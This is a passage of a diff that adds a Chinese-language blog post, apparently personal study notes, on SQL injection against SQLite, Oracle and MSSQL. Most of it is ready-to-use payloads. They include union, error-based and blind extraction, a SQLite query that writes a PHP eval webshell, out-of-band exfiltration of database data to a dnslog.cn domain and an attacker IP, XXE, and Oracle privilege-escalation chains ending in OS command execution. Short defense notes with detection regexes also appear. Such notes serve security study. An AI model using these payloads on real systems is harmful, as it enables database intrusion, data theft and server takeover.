+rmdir /s /q C:\Windows\system32\wbem\Repository\
+
+# 手动删除 mof 文件
+del C:\Windows\system32\wbem\mof\good\test.mof /F /S
+
+# 删除创建的用户
+net user hacker /delete
+
+# 重新启动服务
+net start winmgmt
+</code></pre>
+<h4 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h4><p>将脚本写入到启动项路径，等待用户重启</p>
+<h4 id="CVE-2016-6663"><a href="#CVE-2016-6663" class="headerlink" title="CVE-2016-6663"></a>CVE-2016-6663</h4><p>竞争条件提权漏洞，一个拥有 CREATE&#x2F;INSERT&#x2F;SELECT 低权限的账户提权成功后可以系统用户身份执行任意代码，提权的用户为 mysql 用户，概括一下就是将低权限的 www-data 权限提升为 mysql 权限</p>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><h5 id="使用参数化过滤语句"><a href="#使用参数化过滤语句" class="headerlink" title="使用参数化过滤语句"></a>使用参数化过滤语句</h5><p>采用了PreparedStatement，就会将sql语句：”select id, no from user where id&#x3D;?” 预先编译好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是什么，都不会影响该sql语句的语法结构了，因为语法分析已经完成了，而语法分析主要是分析sql命令，比如 select ,from ,where ,and, or ,order by 等等。所以即使你后面输入了这些sql命令，也不会被当成sql命令来执行了，因为这些sql命令的执行，必须先得通过语法分析，生成执行计划，既然语法分析已经完成，已经预编译过了，那么后面输入的参数，是绝对不可能作为sql命令来执行的，只会被当做字符串字面值参数。</p>
+<h5 id="严格检查参数的数据类型，还有可以使用一些安全函数"><a href="#严格检查参数的数据类型，还有可以使用一些安全函数" class="headerlink" title="严格检查参数的数据类型，还有可以使用一些安全函数"></a>严格检查参数的数据类型，还有可以使用一些安全函数</h5><h5 id="正则表达式检查sql"><a href="#正则表达式检查sql" class="headerlink" title="正则表达式检查sql"></a>正则表达式检查sql</h5><p>具体的正则表达式：<br>检测SQL meta-characters的正则表达式 ：&#x2F;(%27)|(\’)|(--)|(%23)|(#)&#x2F;ix<br>修正检测SQL meta-characters的正则表达式 ：&#x2F;((%3D)|(&#x3D;))[^\n]<em>((%27)|(\’)|(--)|(%3B)|(:))&#x2F;i<br>典型的SQL 注入攻击的正则表达式 ：&#x2F;\w</em>((%27)|(\’))((%6F)|o|(%4F))((%72)|r|(%52))&#x2F;ix<br>检测SQL注入，UNION查询关键字的正则表达式 ：&#x2F;((%27)|(\’))union&#x2F;ix(%27)|(\’)<br>检测MS SQL Server SQL注入攻击的正则表达式：&#x2F;exec(\s|+)+(s|x)p\w+&#x2F;ix</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10594">https://xz.aliyun.com/t/10594</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html#toc-heading-31">https://www.sqlsec.com/2020/11/mysql.html#toc-heading-31</a></p>
+<h2 id="sqlite利用"><a href="#sqlite利用" class="headerlink" title="sqlite利用"></a>sqlite利用</h2><p>sqlite和mysql等还是有些区别的，sqlite的每一个数据库就是一个文件。</p>
+<h3 id="联合查询-1"><a href="#联合查询-1" class="headerlink" title="联合查询"></a>联合查询</h3><pre><code>1&#39; order by 3;     //使用order by确定查询字段数
+0&#39; union select 1,2,3;
+0&#39; union select 1,2,sql from sqlite_master;                   
+0&#39; union select 1,2,sql from sqlite_master where type=&#39;table&#39;;      //查表名
+0&#39; union select 1,2,sql from sqlite_master where type=&#39;table&#39; and name=&#39;user_data&#39;;  //查字段名
+</code></pre>
+<p>多条结果：</p>
+<pre><code>0&#39; union select 1,2,group_concat(tbl_name) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; --
+或者使用limit来输出一行结果
+0&#39; union select 1,2,tbl_name FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; limit 2 offset 1 --
+</code></pre>
+<p>似乎无法通过sqlite的语句查看有哪些数据库，可以通过命令行查看文件知道</p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h5 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>与mysql基本相同</p>
+<pre><code>select * from test where id =1 union select 1,length(sqlite_version())=6	//判断数据库版本长度
+select * from test where id=1 and substr(sqlite_version(),1,1)=&#39;3&#39;		//判断数据库版本第一个字符是否为3
+</code></pre>
+<h5 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>sqlite没有sleep()函数，但是有个函数randomblob(N)，作用是返回一个 N 字节长的包含伪随机字节的 BLOG。 N 是正整数。可以用它来制造延时。</p>
+<p>而且sqlite没有if函数，可以使用case来构造条件</p>
+<pre><code>select * from test where id=1 and 1=(case when(substr(sqlite_version(),1,1)=&#39;3&#39;) then randomblob(1000000000) else 0 end);
+</code></pre>
+<h3 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h3><p>由于sqlite数据库即文件的特点，我们可以创建新数据库，在新数据库建表插入payload</p>
+<p>ATTACH DATABASE命令</p>
+<p>假设这样一种情况，当在同一时间有多个数据库可用，您想使用其中的任何一个。SQLite 的 ATTACH DATABASE 语句是用来选择一个特定的数据库，使用该命令后，所有的 SQLite 语句将在附加的数据库下执行</p>
+<p>payload：</p>
+<pre><code>&#39;;ATTACH DATABASE &#39;/var/www/html/sqlite_test/shell.php&#39; AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES (&#39;&lt;?php @eval($_POST[&quot;x&quot;]); ?&gt;&#39;); --
+</code></pre>
+<h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><p>Perl<code>和 </code>PHP&#96; 中可以对用户输入的数据进行转义从而来防止 SQL 注入</p>
+<p>PHP 中可以使用 <code>PHP_PDO</code> 的 <code>PDO:prepare()</code> 方法来预处理 SQL 语句，然后使用 <code>PDOStatement::bindParam()</code> 方法绑定参数，或者在 <code>PDOStatement::execute()</code> 传入参数来预防 SQL 注入</p>
+<h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8627#toc-6">https://xz.aliyun.com/t/8627#toc-6</a></p>
+<h2 id="oracle利用"><a href="#oracle利用" class="headerlink" title="oracle利用"></a>oracle利用</h2><p>Oracle和MySQL数据库语法大致相同，结构不太相同。<strong>最大的一个特点就是oracle可以调用Java代码。</strong></p>
+<p>对于“数据库”这个概念而言，Oracle采用了”表空间“的定义。数据文件就是由多个表空间组成的，这些数据文件和相关文件形成一个完整的数据库。当数据库创建时，Oracle 会默认创建五个表空间：SYSTEM、SYSAUX、USERS、UNDOTBS、TEMP：</p>
+<ol>
+<li>SYSTEM：看名字就知道这个用于是存储系统表和管理配置等基本信息</li>
+<li>SYSAUX：类似于 SYSTEM，主要存放一些系统附加信息，以便减轻 SYSTEM 的空间负担</li>
+<li>UNDOTBS：用于事务回退等</li>
+<li>TEMP：作为缓存空间减少内存负担</li>
+<li>USERS：就是存储我们定义的表和数据</li>
+</ol>
+<p>在Oracle中每个表空间中均存在一张dual表，这个表是虚表，并没有实际的存储意义，它永远只存储一条数据，因为Oracle的SQL语法要求select后必须跟上from，所以我们通常使用dual来作为计算、查询时间等SQL语句中from之后的虚表占位，也就是<code>select 1+1 from dual</code>。</p>
+<p>再来看Oracle中用户和权限划分：Oracle 中划分了许多用户权限，权限的集合称为角色。例如 CONNECT 角色具有连接到数据库权限，RESOURCE 能进行基本的增删改查，DBA 则集合了所有的用户权限。在创建数据库时，会默认启用 sys、system 等用户：</p>
+<ol>
+<li>sys：相当于 Linux 下的 root 用户。为 DBA 角色</li>
+<li>system：与 sys 类似，但是相对于 sys 用户，无法修改一些关键的系统数据，这些数据维持着数据库的正常运行。为 DBA 角色。</li>
+<li>public：public 代指所有用户（everyone），对其操作会应用到所有用户上（实际上是所有用户都有 public 用户拥有的权限，如果将 DBA 权限给了 public，那么也就意味着所有用户都有了 DBA 权限）</li>
+</ol>
+<p>Oracle的系统表：</p>
+<ul>
+<li>dba_tables : 系统里所有的表的信息，需要DBA权限才能查询</li>
+<li>all_tables : 当前用户有权限的表的信息</li>
+<li>user_tables: 当前用户名下的表的信息</li>
+<li>DBA_ALL_TABLES：DBA 用户所拥有的或有访问权限的对象和表</li>
+<li>ALL_ALL_TABLES：某一用户拥有的或有访问权限的对象和表</li>
+<li>USER_ALL_TABLES：某一用户所拥有的对象和表</li>
+</ul>
+<p><strong>DBA_TABLES &gt;&#x3D; ALL_TABLES &gt;&#x3D; USER_TABLES</strong></p>
+<pre><code>SELECT banner FROM v$version WHERE banner LIKE &#39;Oracle%25&#39;		//获取数据库版本信息
+
+SELECT banner FROM v$version where banner like &#39;TNS%25&#39;		//获取操作系统版本信息
+
+SELECT name FROM v$database		//获取当前数据库
+
+SELECT user FROM dual;	//获取数据库用户
+
+SELECT username FROM all_users;		//获取所有数据库用户
+
+SELECT * FROM session_privs	//获取当前用户权限
+
+SELECT DISTINCT owner, table_name FROM all_tables		//获取当前用户有权限的所有数据库
+
+SELECT column_name FROM all_tab_columns		//获取字段名
+</code></pre>
+<h3 id="联合查询-2"><a href="#联合查询-2" class="headerlink" title="联合查询"></a>联合查询</h3><p>order by 猜字段数量，union select进行查询，需要注意的是每一个字段都需要对应前面select的数据类型(字符串&#x2F;数字)。所以我们一般先使用null字符占位，然后逐位判断每个字段的类型，</p>
+<pre><code>admin&#39; union select 1,&#39;asd&#39;,null from dual --		//若正常说明四个字段，第一个字符型第二个数字型
+
+admin&#39; union select 1,(SELECT global_name FROM global_name),null from dual --		// 
+
+查当前数据库
+
+admin&#39; union select 1,(select LISTAGG(table_name,&#39;,&#39;)within group(order by owner)name from all_tables where owner=&#39;SYSTEM&#39;),null from dual -- 		//查表，wmsys.wm_concat()等同于MySQL中的group_concat()，在11gr2和12C上已经抛弃，可以用LISTAGG()替代。但是LISTAGG()返回的是varchar类型，如果数据表很多会出现字符串长度过长的问题。这个时候可以使用通过字符串截取来进行
+
+admin&#39; union select 1,(select column_name from all_tab_columns where table_name=&#39;TEST&#39; and rownum=2),null from dual -- 		//查字段
+</code></pre>
+<h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="utl-inaddr-get-host-name"><a href="#utl-inaddr-get-host-name" class="headerlink" title="utl_inaddr.get_host_name"></a>utl_inaddr.get_host_name</h4><pre><code class="sql">select utl_inaddr.get_host_name((select user from dual)) from dual;
+</code></pre>
+<p>11g之后，使用此函数的数据库用户需要有访问网络的权限</p>
+<h4 id="ctxsys-drithsx-sn"><a href="#ctxsys-drithsx-sn" class="headerlink" title="ctxsys.drithsx.sn"></a>ctxsys.drithsx.sn</h4><pre><code class="sql">select ctxsys.drithsx.sn(1, (select user from dual)) from dual;
+</code></pre>
+<p>处理文本的函数，参数错误时会报错。</p>
+<h4 id="CTXSYS-CTX-REPORT-TOKEN-TYPE"><a href="#CTXSYS-CTX-REPORT-TOKEN-TYPE" class="headerlink" title="CTXSYS.CTX_REPORT.TOKEN_TYPE"></a>CTXSYS.CTX_REPORT.TOKEN_TYPE</h4><pre><code class="sql">select CTXSYS.CTX_REPORT.TOKEN_TYPE((select user from dual), &#39;123&#39;) from dual;
+</code></pre>
+<h4 id="XMLType"><a href="#XMLType" class="headerlink" title="XMLType"></a>XMLType</h4><pre><code class="fallback">admin&#39; and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --
+</code></pre>
+<p>注意url编码，如果返回的数据有空格的话，它会自动截断，导致数据不完整，这种情况下先转为 hex，再导出</p>
+<h4 id="dbms-xdb-version-checkin"><a href="#dbms-xdb-version-checkin" class="headerlink" title="dbms_xdb_version.checkin"></a>dbms_xdb_version.checkin</h4><pre><code class="sql">select dbms_xdb_version.checkin((select user from dual)) from dual;
+</code></pre>
+<h4 id="dbms-xdb-version-makeversioned"><a href="#dbms-xdb-version-makeversioned" class="headerlink" title="dbms_xdb_version.makeversioned"></a>dbms_xdb_version.makeversioned</h4><pre><code class="sql">select dbms_xdb_version.makeversioned((select user from dual)) from dual;
+</code></pre>
+<h4 id="dbms-xdb-version-uncheckout"><a href="#dbms-xdb-version-uncheckout" class="headerlink" title="dbms_xdb_version.uncheckout"></a>dbms_xdb_version.uncheckout</h4><pre><code class="sql">select dbms_xdb_version.uncheckout((select user from dual)) from dual;
+</code></pre>
+<h4 id="dbms-utility-sqlid-to-sqlhash"><a href="#dbms-utility-sqlid-to-sqlhash" class="headerlink" title="dbms_utility.sqlid_to_sqlhash"></a>dbms_utility.sqlid_to_sqlhash</h4><pre><code class="sql">SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual;
+</code></pre>
+<h4 id="ordsys-ord-dicom-getmappingxpath"><a href="#ordsys-ord-dicom-getmappingxpath" class="headerlink" title="ordsys.ord_dicom.getmappingxpath"></a>ordsys.ord_dicom.getmappingxpath</h4><pre><code class="sql">select ordsys.ord_dicom.getmappingxpath((select user from dual), 1, 1) from dual;
+</code></pre>
+<h4 id="UTL-INADDR-get-host-name"><a href="#UTL-INADDR-get-host-name" class="headerlink" title="UTL_INADDR.get_host_name"></a>UTL_INADDR.get_host_name</h4><p>版本：11g以后</p>
+<pre><code class="sql">select UTL_INADDR.get_host_name((select user from dual)) from dual;
+</code></pre>
+<h4 id="UTL-INADDR-get-host-address"><a href="#UTL-INADDR-get-host-address" class="headerlink" title="UTL_INADDR.get_host_address"></a>UTL_INADDR.get_host_address</h4><pre><code class="sql">select UTL_INADDR.get_host_name(&#39;~&#39;||(select user from dual)||&#39;~&#39;) from dual;
+</code></pre>
+<h3 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h3><h4 id="布尔盲注-2"><a href="#布尔盲注-2" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>字符串比较</p>
+<pre><code class="sql">admin&#39; and (select substr(user, 1, 1) from dual)=&#39;S&#39; --
+</code></pre>
+<p>decode配合除数0</p>
+<pre><code class="sql">admin&#39; and 1=(select decode(substr(user, 1, 1), &#39;S&#39;, (1/1),0) from dual) -
+</code></pre>
+<h4 id="时间盲注-2"><a href="#时间盲注-2" class="headerlink" title="时间盲注"></a>时间盲注</h4><p> DBMS_PIPE.RECEIVE_MESSAGE(‘任意值’,延迟时间)</p>
+<pre><code class="sql">select 1 from dual where DBMS_PIPE.RECEIVE_MESSAGE(&#39;asd&#39;, REPLACE((SELECT substr(user, 1, 1) FROM dual), &#39;S&#39;, 10))=1;
+</code></pre>
+<p>decode()与高耗时SQL操作的组合</p>
+<pre><code class="sql">and 1=(select decode(substr(user,1,1),&#39;B&#39;,(select count(*) from all_objects),0) from dual)--+
+</code></pre>
+<h3 id="外代查询"><a href="#外代查询" class="headerlink" title="外代查询"></a>外代查询</h3><h4 id="utl-http-request"><a href="#utl-http-request" class="headerlink" title="utl_http.request"></a>utl_http.request</h4><p>需要出外网HTTP</p>
+<pre><code>http://xxx.xxx.xx.xx/xxx/selcet?suser=1&amp;sname=1&#39;  and 1=utl_http.request(&#39;http://XXXXXXXXXXX/&#39;||(select banner from sys.v_$version where rownum=1)) --
+</code></pre>
+<p>11g之后需要网络访问权限</p>
+<h4 id="utl-inaddr-get-host-address"><a href="#utl-inaddr-get-host-address" class="headerlink" title="utl_inaddr.get_host_address"></a>utl_inaddr.get_host_address</h4><p>dns解析带外</p>
+<pre><code>http://xxx.xxx.xx.xx/xxx/selcet?suser=1&amp;sname=1&#39; and (select utl_inaddr.get_host_address((select user from dual)||&#39;.xxx.xxx&#39;) from dual)is not null--
+</code></pre>
+<p>11g之后需要网络访问权限</p>
+<h4 id="SYS-DBMS-LDAP-INIT"><a href="#SYS-DBMS-LDAP-INIT" class="headerlink" title="SYS.DBMS_LDAP.INIT"></a>SYS.DBMS_LDAP.INIT</h4><p>这个函数在 10g&#x2F;11g 中是 public 权限.</p>
+<pre><code class="sql">SELECT DBMS_LDAP.INIT((select user from dual)||&#39;.24wypw.dnslog.cn&#39;,80) FROM DUAL;
+</code></pre>
+<h4 id="HTTPURITYPE"><a href="#HTTPURITYPE" class="headerlink" title="HTTPURITYPE"></a>HTTPURITYPE</h4><pre><code class="sql">SELECT HTTPURITYPE((select user from dual)||&#39;.24wypw.dnslog.cn&#39;).GETCLOB() FROM DUAL;
+</code></pre>
+<h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p>如果 Oracle 版本 &lt;&#x3D; 10g，可以尝试以下函数：</p>
+<ol>
+<li>UTL_INADDR.GET_HOST_ADDRESS</li>
+<li>UTL_HTTP.REQUEST</li>
+<li>HTTP_URITYPE.GETCLOB</li>
+<li>DBMS_LDAP.INIT and UTL_TCP</li>
+</ol>
+<h3 id="XXE-CVE-2014-6577"><a href="#XXE-CVE-2014-6577" class="headerlink" title="XXE (CVE-2014-6577)"></a>XXE (CVE-2014-6577)</h3><p>受影响版本：11.2.0.3, 11.2.0.4, 12.1.0.1 和12.1.0.2</p>
+<p>所需权限：创建会话（CREATE SESSION）</p>
+<p>http</p>
+<pre><code class="sql">select 1 from dual where 1=(select extractvalue(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://192.168.124.1/&#39;||(SELECT user from dual)||&#39;&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) from dual); 
+</code></pre>
+<p>ftp</p>
+<pre><code class="sql">select extractvalue(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;ftp://&#39;||user||&#39;:bar@IP/test&quot;&gt; %remote; %param1;]&gt;&#39;),&#39;/l&#39;) from dual;
+</code></pre>
+<h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><h4 id="GET-DOMAIN-INDEX-TABLES函数注入"><a href="#GET-DOMAIN-INDEX-TABLES函数注入" class="headerlink" title="GET_DOMAIN_INDEX_TABLES函数注入"></a>GET_DOMAIN_INDEX_TABLES函数注入</h4><p>影响版本:Oracle 8.1.7.4, 9.2.0.1 - 9.2.0.7, 10.1.0.2 - 10.1.0.4, 10.2.0.1-10.2.0.2</p>
+<p>漏洞的成因是该函数的参数存在注入，而该函数的所有者是sys，所以通过注入就可以执行任意sql，该函数的执行权限为public，所以只要遇到一个oracle的注入点并且存在这个漏洞的，基本上都可以提升到最高权限。</p>
+<pre><code>提权
+
+admin&#39; and (SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS _OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;grant dba to public&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0)) is not null--
+
+创建Java代码执行命令
+
+admin&#39; and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace and compile java source named &quot;Command&quot; as import java.io.*;public class Command&#123;public static String exec(String cmd) throws Exception&#123;String sb=&quot;&quot;;BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());BufferedReader inBr = new BufferedReader(new InputStreamReader(in));String lineStr;while ((lineStr = inBr.readLine()) != null)sb+=lineStr+&quot;\n&quot;;inBr.close();in.close();return sb;&#125;&#125;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual) is not null --
+
+赋予Java执行权限
+
+admin&#39; and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;begin dbms_java.grant_permission( &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;PUBLIC&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;SYS:java.io.FilePermission&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&lt;&lt;ALL FILES&gt;&gt;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;execute&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; );end;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual) is not null --
+
+创建函数
+
+admin&#39; and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace function cmd(p_cmd in varchar2) return varchar2 as language java name &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;Command.exec(java.lang.String) return String&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;; &#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual) is not null --
+
+赋予函数执行权限
+
+admin&#39; and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;grant all on cmd to public&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual) is not null--
+
+执行命令
+
+admin&#39; and (select sys.cmd(&#39;cmd.exe /c whoami&#39;) from dual) is not null--
+</code></pre>
+<h4 id="DBMS-JVM-EXP-PERMS绕过JVM执行命令"><a href="#DBMS-JVM-EXP-PERMS绕过JVM执行命令" class="headerlink" title="DBMS_JVM_EXP_PERMS绕过JVM执行命令"></a>DBMS_JVM_EXP_PERMS绕过JVM执行命令</h4><p>需具有创建会话权限，windows系统</p>
+<p>影响版本：10gR2、11gR1 和 11gR2 </p>
+<pre><code>SQL&gt; CONNECT / AS SYSDBA
+Connected.
+SQL&gt; CREATE USER Test IDENTIFIED BY Test;
+
+User created.
+
+SQL&gt; GRANT CREATE SESSION TO Test;
+
+Grant succeeded.
+
+SQL&gt; SELECT TYPE_NAME, NAME, ACTION FROM DBA_JAVA_POLICY WHERE GRANTEE = ‘TEST’;
+
+no rows selected
+
+SQL&gt; CONNECT Test/test
+Connected.
+
+SQL&gt; DECLARE
+   POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
+   CURSOR C1 IS SELECT
+‘GRANT’,’GREMLIN’,’SYS’,’java.io.FilePermission’,&#39;&lt;FILES&gt;&gt;’,’execute’,’ENABLED’ FROM DUAL; 
+  BEGIN
+  OPEN C1;
+  FETCH C1 BULK COLLECT INTO POL;
+  CLOSE C1;
+  DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
+  END;
+  /
+
+PL/SQL procedure successfully completed.
+
+SQL&gt; CONNECT / AS SYSDBA
+Connected.
+
+SQL&gt; COL TYPE_NAME FOR A30;
+SQL&gt; COL NAME FOR A30;
+SQL&gt; COL ACTION FOR A10;
+SQL&gt; SELECT TYPE_NAME, NAME, ACTION FROM DBA_JAVA_POLICY WHERE GRANTEE = ‘TEST’;
+
+TYPE_NAME                      NAME                           ACTION
+—————————— —————————— ———-
+java.io.FilePermission         &lt;&gt;                  execute
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/33601">https://www.exploit-db.com/exploits/33601</a></p>
+<h4 id="xml反序列化绕过JVM执行命令-CVE-2018-3004"><a href="#xml反序列化绕过JVM执行命令-CVE-2018-3004" class="headerlink" title="xml反序列化绕过JVM执行命令 CVE-2018-3004"></a>xml反序列化绕过JVM执行命令 CVE-2018-3004</h4><p>如果当前数据库用户具有connect和resource权限，则可以尝试使用反序列化来进行执行命令。Oracle Enterprise Edition 有一个嵌入数据库的Java虚拟机，而Oracle数据库则通过Java存储过程来支持Java的本地执行。</p>
+<p>看不懂</p>
+<p><a target="_blank" rel="noopener" href="http://obtruse.syfrtext.com/2018/07/oracle-privilege-escalation-via.html">http://obtruse.syfrtext.com/2018/07/oracle-privilege-escalation-via.html</a></p>
+<h3 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h3><p>1.永远不要信任用户的输入。对用户的输入进行校验，可以通过 正则表达式，或限制长度；对单引号和<br>双”-“进行转换等。<br>2.永远不要使用动态拼装sql，可以使用参数化的sql或者直接使用 存储过程进行数据查询存取。<br>3.永远不要使用 管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。<br>4.不要把机密信息直接存放，加密或者hash掉密码和敏感的信息。<br>5.应用的异常信息应该给出尽可能少的提示，最好使用自定义的 错误信息对原始错误信息进行包装<br>6.sql注入的检测方法一般采取辅助 软件或网站平台来检测，软件一般采用sql注入检测工具jsky，网站平台就有亿思 网站安全平台检测工具。MDCSOFT SCAN等。采用 MDCSOFT-IPS可以有效的防御SQL注入，XSS攻击等。</p>
+<h2 id="SQL-Server（MSsql）利用"><a href="#SQL-Server（MSsql）利用" class="headerlink" title="SQL Server（MSsql）利用"></a>SQL Server（MSsql）利用</h2><p>对与mssql有三个权限，</p>
+<p>sa（最高权限，相当于system），</p>
+<p>db（文件管理，数据库操作等等，相当于user-administrator），</p>
+<p>public（数据库操作权限，相当于guest-users）</p>
+<p>MSSQL的系统自带库–&gt;master</p>
+<p>​    在MSSQL中每个库都有一个系统自带表–&gt;sysobjects</p>
+<p>​    此系统表中对我们有用的只有3个字段，NAME字段和XTYPE字段和ID字段，name就是表名信息，xtype是代表表的类型，只有两个参数，S代表系统自带表，U代表用户创建的表，id字段的值用来连接</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="判断是否为mssql"><a href="#判断是否为mssql" class="headerlink" title="判断是否为mssql"></a>判断是否为mssql</h4><pre><code class="javascript">?id=1 and (select count(*) from sysobjects)&gt;0
+</code></pre>
+<h4 id="判断权限"><a href="#判断权限" class="headerlink" title="判断权限"></a>判断权限</h4><pre><code class="javascript">and 1=(select IS_SRVROLEMEMBER(&#39;sysadmin&#39;));--
+and 1=(select IS_SRVROLEMEMBER(&#39;serveradmin&#39;));--
+and 1=(select IS_SRVROLEMEMBER(&#39;setupadmin&#39;));--
+and 1=(select IS_SRVROLEMEMBER(&#39;securityadmin&#39;));--
+and 1=(select IS_SRVROLEMEMBER(&#39;diskadmin&#39;));--
+and 1=(select IS_SRVROLEMEMBER(&#39;bulkadmin&#39;));--
+and 1=(select IS_MEMBER(&#39;db_owner&#39;));-
+</code></pre>
+<p>如果当前用户是sa，则执行三个都正常显示。如果是db_owner，则执行sa不正常显示，执行public正常显示。如果是public，则只执行public才正常显示</p>
+<h4 id="查看数据库版本"><a href="#查看数据库版本" class="headerlink" title="查看数据库版本"></a>查看数据库版本</h4><pre><code class="javascript">?id=1 and 1=(select @@version)
+</code></pre>
+<h4 id="查看当前数据库名称"><a href="#查看当前数据库名称" class="headerlink" title="查看当前数据库名称"></a>查看当前数据库名称</h4><pre><code class="javascript">?id=1 and 1=(select db_name())
+</code></pre>
+<h4 id="查看第一个用户数据库"><a href="#查看第一个用户数据库" class="headerlink" title="查看第一个用户数据库"></a>查看第一个用户数据库</h4><pre><code class="javascript">?id=1 and 1=(select top 1 name from master..sysdatabases where dbid&gt;4)
+</code></pre>
+<p>dbid&lt;4的数据库是系统自带</p>
+<h4 id="查看所有数据库"><a href="#查看所有数据库" class="headerlink" title="查看所有数据库"></a>查看所有数据库</h4><pre><code class="javascript">?id=1 and 1=(select name from master..sysdatabases for xml path)
+</code></pre>
+<h4 id="获取当前网站使用数据库的表"><a href="#获取当前网站使用数据库的表" class="headerlink" title="获取当前网站使用数据库的表"></a>获取当前网站使用数据库的表</h4><pre><code class="javascript">?id=1 and 1=(select name from sysobjects for xml path)
+</code></pre>
+<h4 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h4><pre><code class="javascript">?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&#39;users&#39;))
+</code></pre>
+<h3 id="盲注-2"><a href="#盲注-2" class="headerlink" title="盲注"></a>盲注</h3><h4 id="布尔盲注-3"><a href="#布尔盲注-3" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><pre><code>and len(db_name(1))&gt;5   //数据库长度
